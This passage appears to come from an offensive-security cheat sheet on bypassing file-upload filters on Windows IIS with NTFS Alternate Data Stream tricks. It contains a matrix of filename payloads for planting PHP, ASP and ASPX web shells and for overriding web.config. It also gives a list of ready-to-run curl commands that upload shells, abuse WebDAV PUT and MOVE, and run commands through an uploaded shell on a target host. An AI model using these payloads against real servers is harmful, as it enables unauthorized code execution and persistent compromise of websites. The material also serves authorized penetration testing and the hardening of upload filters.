│              │  ┌────────────────────┐  │                           │
│              │  │ Persistence        │  │                           │
│              │  │ • ADS backdoors    │  │                           │
│              │  │ • Scheduled tasks  │  │                           │
│              │  │ • Service installs │  │                           │
│              │  │ • Registry keys    │  │                           │
│              │  └────────────────────┘  │                           │
│              │                          │                           │
│              └──────────────────────────┘                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

::

---

## ADS Bypass Payload Matrix

::collapsible

| Filename Pattern | Filter Sees | NTFS Writes | IIS Executes | Risk Level |
|------------------|-------------|-------------|:------------:|:----------:|
| `shell.php::$DATA` | `::$DATA` or unknown ext | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.asp::$DATA` | `::$DATA` or unknown ext | `shell.asp` | ✅ ASP | 🔴 Critical |
| `shell.aspx::$DATA` | `::$DATA` or unknown ext | `shell.aspx` | ✅ ASPX | 🔴 Critical |
| `shell.php.::$DATA` | `.::$DATA` | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.php..::$DATA` | `..::$DATA` | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.php.jpg::$DATA` | `.jpg::$DATA` or `.jpg` | `shell.php.jpg` | ⚠️ Depends | 🟡 Medium |
| `shell.jpg.php::$DATA` | `.php::$DATA` | `shell.jpg.php` | ✅ PHP | 🔴 Critical |
| `shell.php::$DATA.jpg` | `.jpg` | Varies | ⚠️ Depends | 🟡 Medium |
| `image.jpg:shell.php` | `.php` (named stream) | ADS on `image.jpg` | ⚠️ If resolved | 🟠 High |
| `shell.php ` (trailing space) | `.php ` | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.php.` (trailing dot) | `.php.` or `.` | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.php::$DATA%00.jpg` | `.jpg` | `shell.php` | ✅ PHP | 🔴 Critical |
| `shell.asp;.jpg::$DATA` | `.jpg::$DATA` | `shell.asp;.jpg` | ✅ ASP (IIS) | 🔴 Critical |
| `SHELL~1.PHP::$DATA` | `::$DATA` | `SHELL~1.PHP` | ✅ PHP | 🔴 Critical |
| `web.config::$DATA` | `::$DATA` | `web.config` | ✅ Config | 🔴 Critical |
| `.:shell.php` | `.php` | Current dir ADS | ⚠️ If resolved | 🟡 Medium |
| `..:shell.php` | `.php` | Parent dir ADS | ⚠️ If resolved | 🟡 Medium |

::badge
✅ = Executes | ⚠️ = Conditional | 🔴 = Critical | 🟠 = High | 🟡 = Medium
::

::

---

## Quick Reference Cheat Sheet

::field-group
  ::field{name="Basic ::$DATA Bypass" type="command"}
  `curl -F "file=@shell.php;filename=shell.php::$DATA" https://target.com/upload`
  ::

  ::field{name="ASP ::$DATA Bypass" type="command"}
  `curl -F "file=@shell.asp;filename=shell.asp::$DATA" https://target.com/upload`
  ::

  ::field{name="Named ADS Hidden Shell" type="command"}
  `curl -F "file=@shell.php;filename=image.jpg:shell.php" https://target.com/upload`
  ::

  ::field{name="Trailing Dot + ADS" type="command"}
  `curl -F "file=@shell.php;filename=shell.php.::$DATA" https://target.com/upload`
  ::

  ::field{name="Path Traversal + ADS" type="command"}
  `curl -F "file=@shell.php;filename=../shell.php::$DATA" https://target.com/upload`
  ::

  ::field{name="IIS Semicolon + ADS" type="command"}
  `curl -F "file=@shell.asp;filename=shell.asp;.jpg::$DATA" https://target.com/upload`
  ::

  ::field{name="URL-Encoded ADS" type="command"}
  `curl -F "file=@shell.php;filename=shell.php%3a%3a%24DATA" https://target.com/upload`
  ::

  ::field{name="WebDAV PUT + ADS" type="command"}
  `curl -X PUT "https://target.com/uploads/shell.php::$DATA" -d 'SHELL_CODE'`
  ::

  ::field{name="WebDAV MOVE + ADS" type="command"}
  `curl -X MOVE "https://target.com/uploads/safe.txt" -H "Destination: /uploads/shell.php::$DATA"`
  ::

  ::field{name="web.config Override" type="command"}
  `curl -F "file=@web.config;filename=web.config::$DATA" https://target.com/upload`
  ::

  ::field{name="ADS Enumeration (Remote)" type="command"}
  `curl "https://target.com/shell.php?cmd=dir+/r+C:\inetpub\wwwroot\"`
  ::

  ::field{name="ADS Bypass Scanner" type="command"}
  `python3 ads_bypass.py -t https://target.com/upload --category all`
  ::
::